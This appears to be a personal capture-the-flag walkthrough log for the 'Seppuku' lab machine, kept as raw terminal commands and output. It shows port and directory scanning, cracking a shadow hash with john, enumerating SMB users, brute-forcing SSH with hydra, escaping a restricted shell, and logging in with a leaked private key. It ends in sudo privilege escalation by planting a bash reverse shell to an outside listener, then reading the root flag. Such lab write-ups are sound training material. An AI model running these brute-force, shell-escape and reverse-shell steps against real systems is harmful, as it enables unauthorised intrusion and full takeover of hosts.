@@ -1,0 +1,536 @@
+
+└─$ nmap -p- 172.16.33.62         
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-24 20:08 CST
+Nmap scan report for 172.16.33.62
+Host is up (0.029s latency).
+Not shown: 65527 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+7080/tcp open  empowerid
+7601/tcp open  unknown
+8088/tcp open  radan-http
+
+└─$ nmap -sV -A 172.16.33.62 -p 21,80,139,445,7080,7601,8088
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-24 20:09 CST
+Nmap scan report for 172.16.33.62
+Host is up (0.030s latency).
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+80/tcp   open  http        nginx 1.14.2
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Restricted Content
+|_http-server-header: nginx/1.14.2
+|_http-title: 401 Authorization Required
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+7080/tcp open  ssl/http    LiteSpeed httpd
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: LiteSpeed
+|_http-title:  404 Not Found
+| tls-alpn: 
+|   h2
+|   spdy/3
+|   spdy/2
+|_  http/1.1
+| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
+| Not valid before: 2020-05-13T06:51:35
+|_Not valid after:  2022-08-11T06:51:35
+7601/tcp open  http        Apache httpd 2.4.38 ((Debian))
+|_http-title: Seppuku
+|_http-server-header: Apache/2.4.38 (Debian)
+8088/tcp open  http        LiteSpeed httpd
+|_http-title: Seppuku
+|_http-server-header: LiteSpeed
+Service Info: Host: SEPPUKU; OS: Unix
+
+Host script results:
+|_clock-skew: mean: -615d14h16m42s, deviation: 2h53m13s, median: -615d15h56m43s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: seppuku
+|   NetBIOS computer name: SEPPUKU\x00
+|   Domain name: \x00
+|   FQDN: seppuku
+|_  System time: 2022-11-16T15:13:33-05:00
+|_nbstat: NetBIOS name: SEPPUKU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2022-11-16T20:13:32
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+
+seppuku jack 
+
+
+└─$ sudo dirsearch -u http://172.16.33.62:7601
+[sudo] password for edk: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                            
+ (_||| _) (/_(_|| (_| )                                                                                                     
+                                                                                                                            
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/edk/reports/http_172.16.33.62_7601/_24-07-24_22-19-02.txt
+
+Target: http://172.16.33.62:7601/
+
+[22:19:02] Starting:                                                                                                        
+[22:19:03] 403 -  279B  - /.ht_wsr.txt                                      
+[22:19:03] 403 -  279B  - /.htaccess.bak1                                   
+[22:19:03] 403 -  279B  - /.htaccess.sample
+[22:19:03] 403 -  279B  - /.htaccess.save                                   
+[22:19:03] 403 -  279B  - /.htaccess.orig
+[22:19:03] 403 -  279B  - /.htaccess_extra                                  
+[22:19:03] 403 -  279B  - /.htaccess_orig                                   
+[22:19:03] 403 -  279B  - /.htaccessBAK
+[22:19:03] 403 -  279B  - /.htaccess_sc
+[22:19:03] 403 -  279B  - /.htaccessOLD
+[22:19:03] 403 -  279B  - /.htaccessOLD2
+[22:19:03] 403 -  279B  - /.htm                                             
+[22:19:03] 403 -  279B  - /.html                                            
+[22:19:03] 403 -  279B  - /.htpasswd_test                                   
+[22:19:03] 403 -  279B  - /.htpasswds
+[22:19:03] 403 -  279B  - /.httr-oauth
+[22:19:05] 301 -  315B  - /a  ->  http://172.16.33.62:7601/a/               
+[22:19:11] 301 -  315B  - /b  ->  http://172.16.33.62:7601/b/               
+[22:19:12] 301 -  315B  - /c  ->  http://172.16.33.62:7601/c/               
+[22:19:13] 301 -  322B  - /ckeditor  ->  http://172.16.33.62:7601/ckeditor/ 
+[22:19:13] 200 -    2KB - /ckeditor/samples/                                
+[22:19:13] 200 -    2KB - /ckeditor/                                        
+[22:19:14] 301 -  315B  - /d  ->  http://172.16.33.62:7601/d/               
+[22:19:14] 301 -  322B  - /database  ->  http://172.16.33.62:7601/database/ 
+[22:19:14] 200 -  406B  - /database/                                        
+[22:19:15] 301 -  315B  - /e  ->  http://172.16.33.62:7601/e/               
+[22:19:16] 301 -  315B  - /f  ->  http://172.16.33.62:7601/f/               
+[22:19:17] 301 -  315B  - /h  ->  http://172.16.33.62:7601/h/               
+[22:19:26] 301 -  315B  - /q  ->  http://172.16.33.62:7601/q/               
+[22:19:27] 301 -  315B  - /r  ->  http://172.16.33.62:7601/r/               
+[22:19:28] 301 -  320B  - /secret  ->  http://172.16.33.62:7601/secret/     
+[22:19:28] 200 -  561B  - /secret/                                          
+[22:19:28] 403 -  279B  - /server-status                                    
+[22:19:28] 403 -  279B  - /server-status/
+[22:19:31] 301 -  315B  - /t  ->  http://172.16.33.62:7601/t/  
+
+#under secret,hostname , passwd, shadow, passwdlist
+
+#from shadow
+┌──(edk㉿kali)-[~/Downloads]
+└─$ sudo nano hash                            
+          r@bbit-hole:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..
+
+
+┌──(edk㉿kali)-[~/Downloads]
+└─$ john hash  
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+a1b2c3           (r@bbit-hole)     
+1g 0:00:00:10 DONE 2/3 (2024-07-24 22:45) 0.09407g/s 1918p/s 1918c/s 1918C/s 123456..crawford
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+└─$ ssh r@bbit-hole@172.16.33.62
+The authenticity of host '172.16.33.62 (172.16.33.62)' can't be established.
+ED25519 key fingerprint is SHA256:yqHsz+l+Cix5O58VkGbVjW7gVhK1bynHhawiKrqXN/8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.33.62' (ED25519) to the list of known hosts.
+r@bbit-hole@172.16.33.62's password: 
+Permission denied, please try again.
+
+#so it must be a rabbit hole.
+
+
+
+
+
+
+
+─$ sudo dirsearch -u http://172.16.33.62:8088
+
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                            
+ (_||| _) (/_(_|| (_| )                                                                                                     
+                                                                                                                            
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/edk/Downloads/reports/http_172.16.33.62_8088/_24-07-24_22-32-25.txt
+
+Target: http://172.16.33.62:8088/
+
+[22:32:25] Starting:                                                                                                        
+[22:32:37] 301 -    1KB - /cgi-bin  ->  http://172.16.33.62:8088/cgi-bin/   
+[22:32:40] 301 -    1KB - /docs  ->  http://172.16.33.62:8088/docs/         
+[22:32:40] 200 -    1KB - /docs/                                            
+[22:32:44] 200 -  159KB - /index.php                                        
+[22:32:44] 200 -   55KB - /index.php/login/ 
+
+  _
+  
+  
+ http://172.16.33.62:8088/index.php 
+    _      _     _____                       _                
+ | |  | |    | |   /  __ \                     | |            
+ | |  | | ___| |__ | /  \/ ___  _ __  ___  ___ | | ___        
+ | |/\| |/ _ \ '_ \| |    / _ \| '_ \/ __|/ _ \| |/ _ \ 
+ \  /\  /  __/ |_) | \__/\ (_) | | | \__ \ (_) | |  __/  
+  \/  \/ \___|____/ \____/\___/|_| |_|___/\___/|_|\___| 
+                 http://web-console.org
+login: seppuku
+password: **********
+Wrong password try again!
+
+
+└─$ enum4linux -a 172.16.33.62
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 24 22:05:31 2024
+
+ =========================================( Target Information )=========================================
+                                                                                                                            
+Target ........... 172.16.33.62                                                                                             
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 172.16.33.62 )============================
+                                                                                                                            
+                                                                                                                            
+[+] Got domain/workgroup name: WORKGROUP                                                                                    
+                                                                                                                            
+                                                                                                                            
+ ================================( Nbtstat Information for 172.16.33.62 )================================
+                                                                                                                            
+Looking up status of 172.16.33.62                                                                                           
+        SEPPUKU         <00> -         B <ACTIVE>  Workstation Service
+        SEPPUKU         <03> -         B <ACTIVE>  Messenger Service
+        SEPPUKU         <20> -         B <ACTIVE>  File Server Service
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ ===================================( Session Check on 172.16.33.62 )===================================
+                                                                                                                            
+                                                                                                                            
+[+] Server 172.16.33.62 allows sessions using username '', password ''                                                      
+                                                                                                                            
+                                                                                                                            
+ ================================( Getting domain SID for 172.16.33.62 )================================
+                                                                                                                            
+Domain Name: WORKGROUP                                                                                                      
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup                                                        
+                                                                                                                            
+                                                                                                                            
+ ===================================( OS information on 172.16.33.62 )===================================
+                                                                                                                            
+                                                                                                                            
+[E] Can't get OS info with smbclient                                                                                        
+                                                                                                                            
+                                                                                                                            
+[+] Got OS info for 172.16.33.62 from srvinfo:                                                                              
+        SEPPUKU        Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian                                                              
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+
+ =======================================( Users on 172.16.33.62 )=======================================
+                                                                                                                            
+Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                     
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 986.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
+
+ =================================( Share Enumeration on 172.16.33.62 )=================================
+                                                                                                                            
+                                                                                                                            
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            RED
+
+[+] Attempting to map shares on 172.16.33.62                                                                                
+                                                                                                                            
+//172.16.33.62/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                           
+
+[E] Can't understand response:                                                                                              
+                                                                                                                            
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                  
+//172.16.33.62/IPC$     Mapping: N/A Listing: N/A Writing: N/A
+
+ ============================( Password Policy Information for 172.16.33.62 )============================
+                                                                                                                            
+                                                                                                                            
+
+[+] Attaching to 172.16.33.62 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] SEPPUKU
+        [+] Builtin
+
+[+] Password Info for Domain: SEPPUKU
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes 
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+
+[+] Retieved partial password policy with rpcclient:                                                                        
+                                                                                                                            
+                                                                                                                            
+Password Complexity: Disabled                                                                                               
+Minimum Password Length: 5
+
+
+ =======================================( Groups on 172.16.33.62 )=======================================
+                                                                                                                            
+                                                                                                                            
+[+] Getting builtin groups:                                                                                                 
+                                                                                                                            
+                                                                                                                            
+[+]  Getting builtin group memberships:                                                                                     
+                                                                                                                            
+                                                                                                                            
+[+]  Getting local groups:                                                                                                  
+                                                                                                                            
+                                                   ==================( Users on 172.16.33.62 via RID cycling (RIDS: 500-550,1000-1050) )==================
+                                                                                                                            
+                                                                                                                            
+[I] Found new SID:                                                                                                          
+S-1-22-1                                                                                                                    
+
+[I] Found new SID:                                                                                                          
+S-1-5-32                                                                                                                    
+
+[I] Found new SID:                                                                                                          
+S-1-5-32                                                                                                                    
+
+[I] Found new SID:                                                                                                          
+S-1-5-32                                                                                                                    
+
+[I] Found new SID:                                                                                                          
+S-1-5-32                                                                                                                    
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                 
+                                                                                                                            
+S-1-22-1-1000 Unix User\seppuku (Local User)                                                                                
+S-1-22-1-1001 Unix User\samurai (Local User)
+S-1-22-1-1002 Unix User\tanto (Local User)
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                 
+                                                                                                                            
+S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                           
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-5-21-1800040000-2589740123-1483388600 and logon username '', password ''                
+                                                                                                                            
+S-1-5-21-1800040000-2589740123-1483388600-501 SEPPUKU\nobody (Local User)                                                   
+S-1-5-21-1800040000-2589740123-1483388600-513 SEPPUKU\None (Domain Group)
+
+
+#useful
+S-1-22-1-1000 Unix User\seppuku (Local User)                                                                                
+S-1-22-1-1001 Unix User\samurai (Local User)
+S-1-22-1-1002 Unix User\tanto (Local User)
+
+
+
+└─$ hydra -l seppuku -P password.lst 172.16.33.62 -s 22 ssh -t 64 -vV
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "linda" - 65 of 115 [child 11] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "magic" - 66 of 115 [child 13] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "merlin" - 67 of 115 [child 9] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "newyork" - 68 of 115 [child 10] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "soccer" - 69 of 115 [child 5] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "thomas" - 70 of 115 [child 6] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "wizard" - 71 of 115 [child 15] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "asdfgh" - 72 of 115 [child 4] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "bandit" - 73 of 115 [child 7] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "batman" - 74 of 115 [child 8] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "boris" - 75 of 115 [child 2] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "butthead" - 76 of 115 [child 16] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "dorothy" - 77 of 115 [child 17] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "eeyoree" - 78 of 115 [child 18] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "fishing" - 79 of 115 [child 20] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "Football" - 80 of 115 [child 28] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "george" - 81 of 115 [child 3] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "happy" - 82 of 115 [child 26] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "iloveyou" - 83 of 115 [child 22] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "jennifer" - 84 of 115 [child 62] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "jonathan" - 85 of 115 [child 63] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "love" - 86 of 115 [child 0] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "marina" - 87 of 115 [child 25] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "master" - 88 of 115 [child 36] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "missy" - 89 of 115 [child 59] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "monday" - 90 of 115 [child 1] (0/22)
+[ATTEMPT] target 172.16.33.62 - login "seppuku" - pass "monkey" - 91 of 115 [child 35] (0/22)
+[22][ssh] host: 172.16.33.62   login: seppuku   password: eeyoree
+[STATUS] attack finished for 172.16.33.62 (waiting for children to complete tests)
+[WARNING] child 61 seems to have died, restarting (this only happens if a module is bad) ... 
+[VERBOSE] Retrying connection for child 61
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 22 final worker threads did not complete until end.
+[ERROR] 22 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-25 07:10:34
+
+└─$ ssh seppuku@172.16.33.62                
+seppuku@172.16.33.62's password: 
+Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 13 10:52:41 2020 from 192.168.1.48
+seppuku@seppuku:~$ id
+uid=1000(seppuku) gid=1000(seppuku) groups=1000(seppuku),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+seppuku@seppuku:~$ cat .passwd 
+12345685213456!@!@A
+
+
+seppuku@seppuku:~$ ls -la
+total 28
+drwxr-xr-x 3 seppuku seppuku 4096 Oct 30 08:30 .
+drwxr-xr-x 5 root    root    4096 May 13  2020 ..
+-rw-r--r-- 1 seppuku seppuku  220 May 13  2020 .bash_logout
+-rw-r--r-- 1 seppuku seppuku 3526 May 13  2020 .bashrc
+drwx------ 3 seppuku seppuku 4096 May 13  2020 .gnupg
+-rw-r--r-- 1 root    root      20 May 13  2020 .passwd
+-rw-r--r-- 1 seppuku seppuku  807 May 13  2020 .profile
+seppuku@seppuku:~$ cd .gnupg/
+-rbash: cd: restricted
+
+python -c 'import os; os.system("/bin/bash");'
+
+seppuku@seppuku:~$ cat .passwd 
+12345685213456!@!@A
+
+
+└─$ ssh tanto@172.16.33.62 -i private.bak 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0664 for 'private.bak' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "private.bak": bad permissions
+tanto@172.16.33.62's password: 
+
+└─$ chmod 600 private.bak 
+
+└─$ ssh tanto@172.16.33.62 -i private.bak
+Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 13 10:53:17 2020 from 192.168.1.48
+tanto@seppuku:~$ 
+
+
+su amurai
+
+amurai@seppuku:/home/tanto$ sudo -l
+Matching Defaults entries for samurai on seppuku:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User samurai may run the following commands on seppuku:
+    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
+
+
+#samurai has nothong privi of tanto/cgi_bin, and there is no such dirction. what to do next is to create this dirc and a file named bin.
+
+#from the web we got, private.bak
+
+└─$ ssh -i private.bak tanto@172.16.33.62
+Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 13 10:53:17 2020 from 192.168.1.48
+tanto@seppuku:~$ 
+tanto@seppuku:~$ mkdir .cgi_bin
+tanto@seppuku:~/.cgi_bin$ echo "bash -c 'bash -i >& /dev/tcp/10.8.0.17/4444 0>&1'" >bin
+
+$back to samurai,
+samurai@seppuku:/home/tanto/.ssh$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/ceshinc 
+
+
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.0.17] from (UNKNOWN) [172.16.33.62] 42586
+root@seppuku:/home/tanto/.ssh# ks -ka
+
+
+root@seppuku:~# cat root.txt
+cat root.txt
+{SunCSR_Seppuku_2020_X}
